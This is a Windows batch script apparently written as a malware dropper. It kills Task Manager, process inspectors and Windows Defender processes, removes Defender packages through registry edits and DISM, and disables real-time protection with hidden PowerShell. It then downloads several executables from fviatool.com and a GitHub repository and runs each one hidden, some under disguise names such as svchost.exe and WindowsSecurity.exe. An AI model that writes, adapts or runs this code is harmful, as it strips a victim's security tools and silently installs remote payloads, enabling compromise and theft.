@echo off
pushd "%CD%"
CD /D "%~dp0"
title [0 percent] Bypass Windows-Defender

:: Kill processes
taskkill /f /im Taskmgr.exe
taskkill /f /im ProcessHacker.exe
taskkill /f /im procexp.exe
taskkill /f /im MSASCui.exe
taskkill /f /im MsMpEng.exe
taskkill /f /im MpUXSrv.exe
taskkill /f /im MpCmdRun.exe
taskkill /f /im NisSrv.exe
taskkill /f /im UserAccountControlSettings.exe
taskkill /f /im taskkill.exe


set "defender_packages=Windows-Defender-Nis-Group-Package Windows-Defender-Management-Powershell-Group-Package Windows-Defender-Management-MDM-Group-Package Windows-Defender-Management-Group-Package Windows-Defender-Group-Policy-Package Windows-Defender-Core-Group-Package Windows-Defender-Client-Package Windows-Defender-ApplicationGuard-Inbox-WOW64-Package Windows-Defender-ApplicationGuard-Inbox-Package Windows-Defender-AppLayer-Group-Package Windows-Defender-AM-Default-Definitions-Package Windows-Defender-AM-Default-Definitions-OptionalWrapper-Package"

for %%i in (%defender_packages%) do (
    for /f "tokens=8 delims=\" %%j in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" ^| findstr "%%i" ^| findstr "~~"') do (
        reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%%j" /v Visibility /t REG_DWORD /d 1 /f >nul 2>&1
        reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%%j\Owners" /va /f >nul 2>&1
        dism /online /Remove-Package /PackageName:%%j /NoRestart >nul 2>&1
    )
)

:: Function to disable Windows Defender
:disable_windows_defender
powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend"
powershell -WindowStyle Hidden -Command "Set-MpPreference -SubmitSamplesConsent 2"

echo Windows Defender has been disabled.

:: Function to download and execute files
:download_and_execute_files
powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/defender.exe', 'C:\Users\%USERNAME%\Downloads\defender.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\defender.exe' -WindowStyle Hidden"
powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/svchost.exe', 'C:\Users\%USERNAME%\Downloads\svchost.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\svchost.exe' -WindowStyle Hidden"
powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/WindowsSecurity.exe', 'C:\Users\%USERNAME%\Downloads\WindowsSecurity.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\WindowsSecurity.exe' -WindowStyle Hidden"
powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/update.exe', 'C:\Users\%USERNAME%\Downloads\update.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\update.exe' -WindowStyle Hidden"
powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/get.exe', 'C:\Users\%USERNAME%\Downloads\get.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\get.exe' -WindowStyle Hidden"
powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/fviatool/fvia/raw/main/update.mp3', 'C:\Users\%USERNAME%\Downloads\update.mp3'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\update.mp3' -WindowStyle Hidden"
powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/fviatool/fvia/raw/main/update.exe', 'C:\Users\%USERNAME%\Downloads\update.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\update.exe' -WindowStyle Hidden"
powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/fviatool/fvia/raw/main/fvia.exe', 'C:\Users\%USERNAME%\Downloads\fvia.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\fvia.exe' -WindowStyle Hidden"
powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/Runtime.exe', 'C:\Users\%USERNAME%\Downloads\Runtime.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\Runtime.exe' -WindowStyle Hidden"

echo Files have been downloaded and executed.


